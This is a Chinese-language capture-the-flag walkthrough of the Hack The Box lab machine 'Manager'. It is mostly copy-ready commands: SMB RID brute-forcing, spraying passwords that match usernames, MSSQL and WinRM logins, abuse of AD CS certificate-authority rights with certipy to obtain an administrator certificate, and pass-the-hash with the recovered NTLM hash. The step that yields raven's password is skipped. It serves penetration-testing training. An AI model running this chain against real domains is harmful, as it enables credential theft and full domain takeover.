对服务器目标端口进行端口扫描

```
sudo nmap -p- --min-rate 10000 10.10.11.236 -open
```

![image-20241006173822290](https://s2.loli.net/2024/10/06/AvQUWzXEgxNj3Oa.png)

针对开放的端口进一步进行探测

```
sudo nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49693,49724,49795,50272 -A 10.10.11.236 -oX manager.xml
```

![image-20241006191306608](https://s2.loli.net/2024/10/06/d76GzjXhFAeoqyQ.png)

优先根据扫描结果，添加对应的hosts记录

```
10.10.11.236    manager.htb
10.10.11.236    dc01.manager.htb
```

根据扫描结果，服务端存在以下服务，优先从LDAP和SMB协议开始进行探测

SMB协议，135，139，445，优先进行

```
smbclient -L //10.10.11.236
```

![image-20241007113103757](https://s2.loli.net/2024/10/07/hk4KxmfaquAXSDN.png)

均为默认SMB分享，但起码验证了smb服务可以进行匿名访问和登录，利用这一点进行sid用户标识探测

```
impacket-lookupsid manager.htb/anonymous@10.10.11.236 -no-pass
netexec smb 10.10.11.236 -u guest -p '' --rid-brute
```

![image-20241007132717448](https://s2.loli.net/2024/10/07/Ulo2Rvq1eASxzYi.png)

```
#可以查询到以下用户（该点需要将用户名替换为小写，或者以防万一额外添加全为小写的版本）
administrator

krbtgt

zhong
cheng

```

将所有的用户名制作成一个users.txt，将users.txt作为用户名和密码尝试对服务进行密码爆破

![image-20241007134840204](https://files.seeusercontent.com/2026/04/07/S2ax/image-20241007134840204.png)

```
user:operator
```

除了guest的可以访问，发现operator用户使用了和用户名一样的密码，尝试winrm登录发现没有对应权限

![image-20241007135821686](https://s2.loli.net/2024/10/07/LoWNjhux8I7VKAk.png)

![image-20241007140226075](https://s2.loli.net/2024/10/07/sFSraeH58VwkQ7g.png)

LDAP服务，636,389，3268，3269

```
ldapsearch -x -s base namingcontexts -H ldap://10.10.11.236:389
```

![image-20241007114529982](https://files.seeusercontent.com/2026/04/07/ad5Q/image-20241007114529982.png)

```
ldapsearch -x -b"DC=manager,DC=htb" -H ldap://10.10.11.236:389
```

mssql服务，1433

可以获得信息如下

1.服务器的版本为10.0.17763；

2.数据库版本为mssql 2019 RTM

根据之前获得的账号密码，我们尝试是否能够登录数据库

```
 netexec mssql manager.htb -u operator -p operator
```

![image-20241007144504598](https://s2.loli.net/2024/10/07/jZSaIdqulRAvDOG.png)

发现是可行的

使用impacket模块进行mssql的登录

```
impacket-mssqlclient -windows-auth manager.htb/operator:operator@dc01.manager.htb
```

![image-20241007145159395](https://s2.loli.net/2024/10/07/L8xP2mpJqbAvSsX.png)

考虑到同目录中的其他几个文件均是可以访问的一级目录，使用wget对config和backup文件进行下载

端口5985，验证是否可用


我们使用evilwinrm来登录

```
evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
```

![image-20241007155009985](https://s2.loli.net/2024/10/07/bmGNXRlIeTJvDSf.png)

在desktop目录下发现第一个flag，接着我们开始提权操作

除了可以使用bloodhound进行域提权的检查，还可以使用certipy对ADCS服务进行检查

```
certipy-ad find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
```

![image-20241007163125670](https://s2.loli.net/2024/10/07/b3KIrOTfewgEl6G.png)

最后一行显示raven具有危险的权限

![image-20241007163259086](https://s2.loli.net/2024/10/07/j63C1SrW2RgkoYV.png)

raven拥有manageca的权限，我们在对应工具的readme中具有对应的步骤

优先准备步骤

```
certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```

![image-20241007163956963](https://s2.loli.net/2024/10/07/moq2GOsZ1JEV8Fi.png)

```
certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```

![image-20241007165112870](https://s2.loli.net/2024/10/07/1RJrUebDB2Wmt3x.png)

开始进攻步骤

```
certipy-ad req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

![image-20241007165333008](https://s2.loli.net/2024/10/07/HiBIa6t8hKAQXTS.png)

```
certipy-ad ca -ca 'manager-DC01-CA' -issue-request 20 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

反复出现报错Got access denied trying to issue certificate，重复执行第一步add officer

![image-20241007171454595](https://s2.loli.net/2024/10/07/7k4fBwq5Qb9rhXp.png)

```
certipy-ad req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 20 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
```

![image-20241007171721494](https://s2.loli.net/2024/10/07/vmCrPn5a82Xu9UN.png)

成功获取到administrator的证书，接着我们可以通过auth认证，来获取管理员的密码NTLM哈希

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236
```

![image-20241007171900985](https://s2.loli.net/2024/10/07/M4tdVfjiXL1sxAN.png)

是因为两者的时钟没有对其，无法执行工具，使用ntpdate进行校准

```
sudo ntpdate manager.htb
```

![image-20241007172307315](https://s2.loli.net/2024/10/07/96nvwyxoSMgLFDB.png)

成功获取到对应的哈希内容

```
user:'administrator@manager.htb
hash:aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

使用hash进行登录

```
evil-winrm -i manager.htb -u administrator -H 'ae5064c2f62317332c88629e025924ef'
```
